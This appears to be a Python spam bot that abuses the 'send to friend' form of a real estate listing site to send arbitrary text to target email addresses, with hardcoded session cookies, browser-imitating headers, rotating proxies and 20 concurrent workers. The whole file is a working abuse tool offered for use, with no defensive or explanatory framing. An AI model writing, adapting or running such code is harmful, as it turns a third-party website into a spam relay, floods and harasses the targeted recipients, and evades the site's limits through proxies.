from os.path import basename

import requests

from module import Spam

cookies = {
    'view': '1',
    'lang': 'ru',
    'PHPSESSID': '52udcbshvo3qu61tsjh24h4rh2',
    '_ga': 'GA1.2.1095253052.1675683454',
    '_gid': 'GA1.2.1490042698.1675683454',
    '__zlcmid': '1EIla8LllHXD0EO',
    'call-me-back': '1',
    '_gat_gtag_UA_18132643_1': '1',
    'cookie': '1',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    # 'Cookie': 'view=1; lang=ru; PHPSESSID=52udcbshvo3qu61tsjh24h4rh2; _ga=GA1.2.1095253052.1675683454; _gid=GA1.2.1490042698.1675683454; __zlcmid=1EIla8LllHXD0EO; call-me-back=1; _gat_gtag_UA_18132643_1=1; cookie=1',
    'Referer': 'https://360hometour.net/ru/imushestvo/2937/villa/novoe-stroitelstvo/ispaniya/costa-blanca-sur/guardamar/guardamar/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(target=target)
        params = {
            'name': text,
            'email': target,
            'fname': text,
            'femail': target,
            'acomment': text,
            'lpd': 'on',
            'lang': 'ru',
            'id': '2937',
            'f060223': '',
        }

        response = requests.get(
            'https://360hometour.net/modules/property/send-friend.php',
            params=params,
            cookies=cookies,
            headers=headers,
            proxies=self.get_proxies(), timeout=30
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'ok', target_pool_name='pobcasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
